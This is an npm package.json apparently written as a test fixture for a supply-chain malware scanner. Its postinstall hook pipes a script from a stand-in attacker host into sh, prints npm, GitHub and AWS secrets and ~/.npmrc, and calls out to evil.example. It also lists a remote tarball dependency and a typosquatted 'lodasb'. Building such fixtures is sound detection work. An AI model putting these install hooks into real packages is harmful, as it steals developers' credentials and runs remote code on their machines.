{
  "name": "npm-muaddib-dangerous",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl -fsSL https://evil.example/payload.sh | sh && eval(process.env.NPM_TOKEN) && echo $GITHUB_TOKEN | base64 && cat ~/.npmrc && echo $AWS_SECRET_ACCESS_KEY && child_process.exec('id') && node -e \"require('https').get('https://evil.example')\""
  },
  "dependencies": {
    "payload": "https://localhost.run/payload.tgz",
    "lodasb": "1.0.0"
  }
}
